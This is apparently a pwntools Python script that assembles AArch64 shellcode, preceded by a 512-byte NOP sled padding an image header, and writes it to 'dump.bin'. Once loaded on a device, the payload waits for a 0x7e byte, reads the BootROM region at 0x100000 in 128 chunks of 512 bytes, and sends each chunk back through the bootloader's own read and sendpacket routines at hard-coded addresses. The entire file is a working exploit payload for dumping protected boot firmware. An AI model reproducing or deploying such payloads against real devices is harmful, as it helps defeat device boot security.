#! /usr/bin/python3 

from pwn import *

context.clear(arch="aarch64")


def main():
    code = """
    mov x21, #0x0

    start_0:
        movz x8, #0x30c8
        movk x8, #0x0001, lsl #16

        ldr x8, [x8]
        ldr x1, [x8, #0x10]
        blr x1

        and w8, w0, #0xff
        cmp w8, #0x7e
        b.ne start_0

    loop_start:
        movz x16, #0xd6d4
        movk x16, #0x0000, lsl #16
        blr x16

        mov x19, x0 
        mov w0, #0x11 /* BSL_CMD_READ_MIDST */
        strh w0, [x19, #0x14]
        mov w0, #0x200 /* read_sz 512 */
        strh w0, [x19, #0x16]

        add x0, x19, #0x18 /*packet->content*/
        mov w2, #0x200 /*read_sz*/

        movz x7, #0x0000
        movk x7, #0x0010, lsl #16 /*BootROM address */

        add x1, x7, x21, lsl #0x9
                
        movz x17, #0xd5b0
        movk x17, #0x0000, lsl #16
        blr x17
        mov x0, x19

        movz x18, #0xd864
        movk x18, #0x0000, lsl #16
        blr x18 /* sendpacket()*/

        mov x0, x19
        movz x19, #0xd728
        movk x19, #0x0000, lsl #16
        blr x19

        add x21, x21, #0x1
        cmp x21, #128
        b.ne start_0

    start_1:
        movz x8, #0x30c8
        movk x8, #0x0001, lsl #16

        ldr x8, [x8]
        ldr x1, [x8, #0x10]
        blr x1

        and w8, w0, #0xff
        cmp w8, #0x7e
        b.ne start_1

    loop_end:
        mov w0, #0x12
        movz x20, #0xd8c0
        movk x20, #0x0000, lsl #16
        blr x20
    """

    #sys_img_header padding 
    shellcode = b"\x1f\x20\x03\xd5" * (0x200//4)
    shellcode += asm(code)
    with open("dump.bin", "wb") as fp: fp.write(shellcode)

main()
